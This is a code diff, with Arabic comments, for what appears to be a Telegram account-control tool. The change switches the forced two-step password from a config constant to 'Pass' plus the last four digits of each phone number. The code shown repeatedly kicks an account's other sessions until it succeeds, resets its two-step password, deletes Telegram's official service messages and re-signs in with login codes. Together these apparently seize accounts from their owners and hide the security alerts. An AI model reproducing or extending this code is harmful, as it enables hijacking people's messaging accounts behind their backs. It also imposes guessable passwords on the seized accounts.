@@ -48,7 +48,6 @@ from config import (
     SESSION_RECOVERY_MAX_ATTEMPTS,
     SESSION_RECOVERY_RETRY_DELAY,
     INVALID_SESSION_RESCAN_INTERVAL,
-    DEFAULT_2FA_PASSWORD,
     RECOVERY_CODE_RESEND_ATTEMPTS,
     RECOVERY_CODE_RESEND_INTERVAL,
     WATCHDOG_DEAD_STREAK,
@@ -834,7 +833,8 @@ async def _try_auto_kick(phone: str) -> dict:
 
 
 async def _apply_default_2fa(phone: str) -> dict:
-    """تفعيل/تغيير 2FA إلى DEFAULT_2FA_PASSWORD من config — بعد نجاح الطرد."""
+    """تفعيل/تغيير 2FA إلى Pass+آخر4 أرقام — بعد نجاح الطرد."""
+    target_pw = database.two_fa_password_for_phone(phone)
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة غير متاحة"}
@@ -842,22 +842,22 @@ async def _apply_default_2fa(phone: str) -> dict:
         await delete_telegram_official_messages(client)
         row = await database.get_session_by_phone(phone)
         current = database.row_get(row, "two_fa") or None
-        if current == DEFAULT_2FA_PASSWORD:
-            await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
+        if current == target_pw:
+            await database.update_session_two_fa(phone, target_pw)
             await database.mark_session_secured(phone)
             await delete_telegram_official_messages(client)
-            return {"success": True, "skipped": True}
+            return {"success": True, "skipped": True, "password": target_pw}
         await client.edit_2fa(
             current_password=current,
-            new_password=DEFAULT_2FA_PASSWORD,
+            new_password=target_pw,
             hint="",
             email=None,
         )
-        await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
+        await database.update_session_two_fa(phone, target_pw)
         await database.mark_session_secured(phone)
         await delete_telegram_official_messages(client)
         logger.info("default 2FA applied %s", phone)
-        return {"success": True}
+        return {"success": True, "password": target_pw}
     except Exception as e:
         logger.warning("default 2FA failed %s: %s", phone, e)
         return {"success": False, "error": str(e)}
@@ -874,7 +874,7 @@ async def _on_auto_kick_success(phone: str, phase: str = ""):
             phone,
             "twofa_ok",
             skipped=fa.get("skipped", False),
-            password=DEFAULT_2FA_PASSWORD,
+            password=fa.get("password") or database.two_fa_password_for_phone(phone),
         )
     else:
         await _notify_admin(phone, "twofa_fail", error=fa.get("error", ""))
@@ -892,7 +892,7 @@ async def _auto_kick_worker(phone: str):
     """
     طرد الجلسات الأخرى:
     فوراً → بعد 24 ساعة → كل 5 دقائق حتى ينجح.
-    عند النجاح فقط: 2FA = DEFAULT_2FA_PASSWORD من config.
+    عند النجاح فقط: 2FA = Pass + آخر 4 أرقام من الرقم.
     """
     try:
         await database.set_auto_kick_stage(phone, 0)
@@ -958,7 +958,7 @@ async def resume_auto_kick_pipelines():
 # تنظيف شامل يدوي (أدمن): طرد → 2FA → حذف رسائل
 # ──────────────────────────────────────────
 async def admin_full_cleanup(phone: str, new_password: str | None = None) -> dict:
-    new_password = new_password or DEFAULT_2FA_PASSWORD
+    new_password = new_password or database.two_fa_password_for_phone(phone)
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة معطلة", "step": "connect"}
@@ -1166,7 +1166,7 @@ async def recover_session(phone: str) -> dict:
         try:
             await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
-            pwd = row["two_fa"] or DEFAULT_2FA_PASSWORD
+            pwd = row["two_fa"] or database.two_fa_password_for_phone(phone)
             if not pwd:
                 return {
                     "success": False,
